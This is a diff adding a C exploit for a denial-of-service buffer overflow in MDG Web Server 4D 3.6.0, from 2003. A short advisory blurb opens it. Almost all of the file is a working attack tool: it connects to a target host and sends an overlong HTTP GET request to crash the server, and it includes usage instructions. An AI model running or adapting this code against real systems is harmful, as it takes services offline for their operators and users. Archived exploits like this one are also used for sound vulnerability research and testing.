@@ -1,0 +1,113 @@
+source: http://www.securityfocus.com/bid/7479/info
+
+A buffer overflow vulnerability has been reported for MDG Web Server. The vulnerability exists when the web server attempts to process overly long HTTP requests. Specifically, when the web server processes a malformed HTTP request of excessive length, the web server will crash. This will result in a denial of service condition. 
+
+/* Web Server 4D 3.6.0 DoS
+*
+* Vulnerable systems:
+* Web Server 4D 3.6.0 DoS
+* Vendor:
+* http://www.mdg.com/
+*
+* Download it here:
+* ftp://ftp.mdg.com/demos/WS4D/Win/WS4D_3.6.0_Full.exe
+*
+* Written and found by badpack3t
+* For SP Research Labs
+* 04/29/2003
+*
+* www.security-protocols.com
+*
+* usage:
+* sp-ws4d [targetport] (default is 80)
+*
+* Greets: c0nnie.
+*/
+
+#include
+#include
+
+#pragma comment(lib, "ws2_32.lib")
+
+char exploit[] =
+
+"GET /<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
+"<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
+"<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
+"<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
+"<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
+"<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
+"<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+HTTP/1.1 ";
+
+
+int main(int argc, char *argv[])
+{
+WSADATA wsaData;
+WORD wVersionRequested;
+struct hostent *pTarget;
+struct sockaddr_in sock;
+char *target, buffer[30000];
+int port,bufsize;
+SOCKET mysocket;
+
+if (argc < 2)
+{
+printf("Web Server 4D 3.6.0 DoS ", argv[0]);
+printf("Tool Usage: %s [targetport] (default is 80) ", argv[0]);
+printf("www.security-protocols.com ", argv[0]);
+exit(1);
+}
+
+wVersionRequested = MAKEWORD(1, 1);
+if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;
+
+target = argv[1];
+
+//for default web attacks
+port = 80;
+
+if (argc >= 3) port = atoi(argv[2]);
+bufsize = 512;
+if (argc >= 4) bufsize = atoi(argv[3]);
+
+mysocket = socket(AF_INET, SOCK_STREAM, 0);
+if(mysocket==INVALID_SOCKET)
+{
+printf("Socket error! ");
+exit(1);
+}
+
+printf("Resolving Hostnames... ");
+if ((pTarget = gethostbyname(target)) == NULL)
+{
+printf("Resolve of %s failed ", argv[1]);
+exit(1);
+}
+
+memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
+sock.sin_family = AF_INET;
+sock.sin_port = htons((USHORT)port);
+
+printf("Connecting... ");
+if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) )))
+{
+printf("Couldn't connect to host. ");
+exit(1);
+}
+
+printf("Connected!... ");
+printf("Sending Payload... ");
+if (send(mysocket, exploit, sizeof(exploit)-1, 0) == -1)
+{
+printf("Error Sending the Exploit Payload ");
+closesocket(mysocket);
+exit(1);
+}
+
+printf("Remote Webserver has been DoS'ed ");
+closesocket(mysocket);
+WSACleanup();
+return 0;
+}
+
